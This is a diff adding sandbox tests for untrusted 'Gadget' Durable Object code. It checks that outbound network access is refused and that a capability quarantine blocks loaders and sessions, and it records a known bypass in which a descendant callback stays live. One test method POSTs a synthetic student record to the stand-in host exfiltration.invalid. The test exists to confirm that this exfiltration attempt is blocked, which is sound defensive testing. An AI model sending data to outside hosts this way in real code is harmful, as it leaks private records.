@@ -29,6 +29,18 @@ export class Gadget extends DurableObject {
     return "hi";
   }
 
+  async attemptExfiltration() {
+    try {
+      await fetch("https://exfiltration.invalid/student", {
+        method: "POST",
+        body: "synthetic-student-record",
+      });
+    } catch (error) {
+      return error.message;
+    }
+    return "outbound fetch unexpectedly succeeded";
+  }
+
   mintCallback(tag) {
     return this.ctx.restore({ type: "callback", tag });
   }
@@ -71,6 +83,16 @@ async function withGadget(fn: (impl: any) => Promise<void>): Promise<void> {
 }
 
 describe("gadget ctx.restore()", () => {
+  it("refuses direct public-network fetch from untrusted Gadget JavaScript",
+      () => withGadget(async impl => {
+    // Exercises loadGadgetWorker's globalOutbound: null in the real workerd sandbox.
+    // No connector or capability-policy decision is involved; use synthetic data only.
+    using gadget = await impl.getGadgetFacet(GADGET_ID);
+    expect(await gadget.attemptExfiltration()).toContain(
+        "This worker is not permitted to access the internet");
+    expect(await gadget.hello()).toBe("hi");
+  }));
+
   it("works through the stub getGadgetFacet hands out, and the result survives storage",
       () => withGadget(async impl => {
     using gadget = await impl.getGadgetFacet(GADGET_ID);
@@ -102,3 +124,43 @@ describe("gadget ctx.restore()", () => {
     await expect(bare.mintCallback("b")).rejects.toThrow();
   }));
 });
+
+
+describe("policy execution quarantine (SCHO-292)", () => {
+  it("blocks a retained root and future loaders but proves descendants remain live",
+      () => withGadget(async impl => {
+    using gadget = await impl.getGadgetFacet(GADGET_ID);
+    using callback = await gadget.mintCallback("pre-policy");
+    expect(await gadget.hello()).toBe("hi");
+    const previous = impl.env.WORKSHOP_CAPABILITY_POLICY;
+    // Even an allowing policy cannot make the raw descendants revocable.
+    impl.env.WORKSHOP_CAPABILITY_POLICY = { authorizeCapability: async () => ({ outcome: "allow" }) };
+    try {
+      await expectQuarantined(gadget.hello());
+      await expectQuarantined(gadget.attemptExfiltration());
+      await expect(impl.getGadgetFacet(GADGET_ID)).rejects.toThrow("transitive revocation");
+      expect(() => impl.loadGadgetWorker(GADGET_ID)).toThrow("transitive revocation");
+      await expect(impl.executeCodeMode(1, "throw new Error('must not run')", {}, "model", {}))
+        .rejects.toThrow("transitive revocation");
+      expect(() => impl.startGatekeeperSession({ type: "gadget", id: GADGET_ID }, { from: "user" }))
+        .toThrow("transitive revocation");
+      expect(() => impl.startGatekeeperSession({ type: "gatekeeper", id: 999 }, { from: "user" }))
+        .toThrow("transitive revocation");
+      await expect(impl.applyPendingAction({ type: "action", gatekeeperId: 999 }, {}, false))
+        .rejects.toThrow("transitive revocation");
+      // Concrete release-blocking repro: a descendant bypasses the root's restriction.
+      // Do not change this assertion into a claim of full revocation.
+      expect(await callback.ping()).toBe("pong:pre-policy");
+    } finally {
+      impl.env.WORKSHOP_CAPABILITY_POLICY = previous;
+    }
+    expect(await gadget.hello()).toBe("hi");
+  }));
+});
+
+// Use one rejection handler: .rejects forks native JsRpcPromise continuations.
+async function expectQuarantined(call: Promise<unknown>): Promise<void> {
+  let caught: unknown;
+  try { await call; } catch (error) { caught = error; }
+  expect(String(caught)).toContain("transitive revocation");
+}
